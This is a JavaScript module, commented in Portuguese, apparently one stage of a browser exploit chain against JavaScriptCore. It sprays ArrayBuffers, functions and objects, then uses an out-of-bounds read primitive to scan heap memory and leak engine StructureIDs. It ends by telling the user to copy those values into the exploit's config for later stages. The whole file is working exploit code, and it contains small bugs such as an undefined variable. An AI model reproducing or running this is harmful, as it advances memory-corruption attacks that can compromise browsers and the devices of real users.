// js/script3/readStructureIDs.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real,
    oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const MAX_SPRAY_OBJS_FOR_ID_LEAK = 150; // Reduzido para potencialmente mitigar OOM
const DEFAULT_AB_SIZE_FOR_ID_LEAK = 128; // Um tamanho um pouco diferente do usado em outros sprays

async function findAndLogStructureIDInternal(objectFactory, objectTypeName, verificationLogicFn, logFn = logS3, currentAttempt = 0) {
    const FNAME = `findAndLogStructureIDInternal<${objectTypeName}>`;
    logFn(` Tentativa #${currentAttempt} para encontrar StructureID de: ${objectTypeName}`, "info", FNAME);

    // triggerOOB_primitive já é chamado antes de cada iteração em discoverStructureIDs
    // mas se chamado aqui, garante isolamento se esta função for usada sozinha.
    // await triggerOOB_primitive(logFn); // Decida se quer re-trigger aqui ou depender do chamador.
    if (!oob_array_buffer_real) {
        logFn("Ambiente OOB não configurado antes de chamar findAndLog. Abortando.", "error", FNAME);
        return null;
    }

    logFn(` Pulverizando ${MAX_SPRAY_OBJS_FOR_ID_LEAK} instâncias de ${objectTypeName}...`, "info", FNAME);
    let sprayedObjects = [];
    for (let i = 0; i < MAX_SPRAY_OBJS_FOR_ID_LEAK; i++) {
        try {
            sprayedObjects.push(objectFactory());
        } catch (e) { /* ignorar */ }
    }
    if (sprayedObjects.length === 0) {
        logFn(`Nenhum objeto ${objectTypeName} pulverizado.`, "warn", FNAME);
        return null;
    }
    await PAUSE_S3(200); // Pausa para estabilização do heap

    let foundStructureID = null;
    const structureIdOffsetInCell = parseInt(JSC_OFFSETS.JSCell.STRUCTURE_ID_OFFSET, 16); // Ex: 0x0
    const structurePtrOffsetInCell = parseInt(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET, 16); // Ex: 0x8

    // Varrer uma porção do oob_array_buffer_real
    const searchStart = Math.max(0, (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - (DEFAULT_AB_SIZE_FOR_ID_LEAK * 10)); // Buscar um pouco antes da janela
    const searchEnd = Math.min(oob_array_buffer_real.byteLength - 32, (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) + (OOB_CONFIG.ALLOCATION_SIZE || 0) + (DEFAULT_AB_SIZE_FOR_ID_LEAK * 10) );

    logFn(` Varrendo de ${toHex(searchStart)} a ${toHex(searchEnd)} dentro de oob_array_buffer_real (tamanho: ${toHex(oob_array_buffer_real.byteLength)})`, "info", FNAME);

    for (let candidateBaseAbsOffset = searchStart; candidateBaseAbsOffset < searchEnd; candidateBaseAbsOffset += 8) { // Alinhamento de 8 bytes
        try {
            const isObjectCandidate = await verificationLogicFn(candidateBaseAbsOffset, objectTypeName, logFn);
            if (isObjectCandidate) {
                // Tentar ler o StructureID diretamente OU via ponteiro para Structure
                let potentialID;
                try {
                    // Opção 1: ID direto na célula
                    potentialID = oob_read_absolute(candidateBaseAbsOffset + structureIdOffsetInCell, 4, logFn);
                    logFn(`  Candidato ${typeName} em ${toHex(candidateBaseAbsOffset)}. ID direto lido: ${toHex(potentialID)}. Verificando...`, "info", FNAME);
                    // Adicionar mais verificações aqui se StructureID direto for usado.
                    // Por exemplo, StructureID deve estar dentro de um range esperado, flags devem ser consistentes, etc.
                    // Um ID de 0 ou FFFFFFFF é geralmente inválido.
                    if (potentialID !== 0 && potentialID !== 0xFFFFFFFF && (potentialID & 0xFF000000) !== 0xFF000000 ) { // Heurística básica
                         foundStructureID = potentialID;
                    }

                } catch (e_direct_id) { /* ignora */ }

                if (foundStructureID) {
                     logFn(`   !!! StructureID (direto) VÁLIDO para ${objectTypeName} em ${toHex(candidateBaseAbsOffset)}: ${toHex(foundStructureID)} !!!`, "vuln", FNAME);
                     break;
                }
                
                // Opção 2: Ler ponteiro para Structure e depois o ID de dentro dela (mais complexo sem addrof e R/W arbitrária completa)
                // Esta parte é muito especulativa se Structure* aponta para fora do oob_array_buffer_real
                /*
                try {
                    const structurePtr = oob_read_absolute(candidateBaseAbsOffset + structurePtrOffsetInCell, 8, logFn);
                    if (isAdvancedInt64Object(structurePtr) && (structurePtr.low() !== 0 || structurePtr.high() !== 0)) {
                        logFn(`  Candidato ${typeName} em ${toHex(candidateBaseAbsOffset)}. Structure* lido: ${structurePtr.toString(true)}.`, "info", FNAME);
                        // AGORA O DESAFIO: structurePtr é um endereço absoluto no processo.
                        // Precisaríamos de um jeito de ler DESSE endereço.
                        // Se por acaso ele apontar PARA DENTRO do nosso oob_array_buffer_real, poderíamos tentar.
                        // const offsetOfStructInOOB = structurePtr.sub(ASSUMED_OOB_REAL_BASE_ADDRESS).low();
                        // if (offsetOfStructInOOB >= 0 && offsetOfStructInOOB + 16 < oob_array_buffer_real.byteLength) {
                        //    const idInStruct = oob_read_absolute(offsetOfStructInOOB + (JSC_OFFSETS.Structure.TYPE_INFO_TYPE_OFFSET || 0xA), 4, logFn);
                        //    logFn(`    ID lido de dentro da Structure apontada: ${toHex(idInStruct)}`, "leak", FNAME);
                        //    foundStructureID = idInStruct;
                        // }
                    }
                } catch (e_struct_ptr) { }
                */

                if (foundStructureID) break;
            }
        } catch (e_verify) { /* ignora */ }
        if (candidateBaseAbsOffset % (1024 * 50) === 0 && candidateBaseAbsOffset > searchStart) { // Logar progresso
            logFn(`   Varredura de ID em ${toHex(candidateBaseAbsOffset)}...`, "info", FNAME);
            await PAUSE_S3(10);
        }
    }

    sprayedObjects = null; // Ajudar GC
    return foundStructureID;
}

// Funções de verificação específicas (precisam ser robustas)
async function verifyArrayBufferAndReturnID(baseAbsOffsetInOOB, typeName, logFn) {
    const sizeOffsetInAB = parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16);
    const structureIdOffset = parseInt(JSC_OFFSETS.JSCell.STRUCTURE_ID_OFFSET, 16);
    try {
        const potentialSize = oob_read_absolute(baseAbsOffsetInOOB + sizeOffsetInAB, 4, logFn);
        if (potentialSize === DEFAULT_AB_SIZE_FOR_ID_LEAK) { // Compara com o tamanho que pulverizamos
            const structureID = oob_read_absolute(baseAbsOffsetInOOB + structureIdOffset, 4, logFn);
            return structureID;
        }
    } catch (e) { /* ignora */ }
    return null;
}

async function verifyJSFunctionAndReturnID(baseAbsOffsetInOOB, typeName, logFn) {
    const structureIdOffset = parseInt(JSC_OFFSETS.JSCell.STRUCTURE_ID_OFFSET, 16);
    const executableOffset = parseInt(JSC_OFFSETS.JSFunction.M_EXECUTABLE_OFFSET, 16);
    try {
        const ptr = oob_read_absolute(baseAbsOffsetInOOB + executableOffset, 8, logFn);
        if (isAdvancedInt64Object(ptr) && (ptr.low() !== 0 || ptr.high() !== 0)) {
            return oob_read_absolute(baseAbsOffsetInOOB + structureIdOffset, 4, logFn);
        }
    } catch (e) { /* ignora */ }
    return null;
}

async function verifyGenericJSObjectAndReturnID(baseAbsOffsetInOOB, typeName, logFn) {
    const structureIdOffset = parseInt(JSC_OFFSETS.JSCell.STRUCTURE_ID_OFFSET, 16);
    const butterflyOffset = parseInt(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET, 16);
    try {
        const ptr = oob_read_absolute(baseAbsOffsetInOOB + butterflyOffset, 8, logFn);
        // Um butterfly pode ser 0 (para objetos vazios) ou um ponteiro válido.
        // Um ponteiro nulo ou um ponteiro que parece "razoável" (não lixo total) pode ser um bom sinal.
        if (isAdvancedInt64Object(ptr)) {
             return oob_read_absolute(baseAbsOffsetInOOB + structureIdOffset, 4, logFn);
        }
    } catch (e) { /* ignora */ }
    return null;
}

export async function discoverStructureIDs() {
    const FNAME_MAIN = "discoverStructureIDs";
    logS3(`==== INICIANDO Descoberta de StructureIDs (S3) v1.1 ====`, "test", FNAME_MAIN);
    const results = {};
    const MAX_ATTEMPTS_PER_TYPE = 2; // Tentar algumas vezes por tipo devido à natureza do heap

    for (let attempt = 1; attempt <= MAX_ATTEMPTS_PER_TYPE; attempt++) {
        logS3(`--- Tentativa Global #${attempt} para todos os tipos ---`, "info", FNAME_MAIN);
        await triggerOOB_primitive(logS3); // Configura o ambiente OOB uma vez por tentativa global
        if (!oob_array_buffer_real) {
            logS3("Falha crítica ao configurar ambiente OOB. Abortando descoberta.", "error", FNAME_MAIN);
            return;
        }

        if (!results.ArrayBuffer) {
            results.ArrayBuffer = await findAndLogStructureIDInternal(() => new ArrayBuffer(DEFAULT_AB_SIZE_FOR_ID_LEAK), "ArrayBuffer", verifyArrayBufferAndReturnID, logS3, attempt);
            await PAUSE_S3(MEDIUM_PAUSE_S3);
        }

        if (!results.JSFunction) {
            results.JSFunction = await findAndLogStructureIDInternal(() => function() { return 1+1; }, "JSFunction", verifyJSFunctionAndReturnID, logS3, attempt);
            await PAUSE_S3(MEDIUM_PAUSE_S3);
        }

        if (!results.JSObjectGeneric) {
             results.JSObjectGeneric = await findAndLogStructureIDInternal(() => ({a:1, b:2}), "JSObjectGeneric", verifyGenericJSObjectAndReturnID, logS3, attempt);
            await PAUSE_S3(MEDIUM_PAUSE_S3);
        }
        clearOOBEnvironment(); // Limpar entre os grandes tipos, se necessário, ou no final de cada tentativa
        if (results.ArrayBuffer && results.JSFunction && results.JSObjectGeneric) break; // Otimização: parar se todos forem encontrados
    }


    logS3("--- Resultados Finais da Descoberta de StructureIDs ---", "test", FNAME_MAIN);
    for (const typeName in results) {
        if (results[typeName] !== null && results[typeName] !== undefined) {
            logS3(`  ${typeName}: ${toHex(results[typeName])}`, "good", FNAME_MAIN);
        } else {
            logS3(`  ${typeName}: Não encontrado ou inválido`, "warn", FNAME_MAIN);
        }
    }
    logS3("PREENCHA OS VALORES ENCONTRADOS EM KNOWN_STRUCTURE_IDS NO SEU config.mjs!", "critical", FNAME_MAIN);
    logS3(`==== Descoberta de StructureIDs CONCLUÍDA ====`, "test", FNAME_MAIN);
}
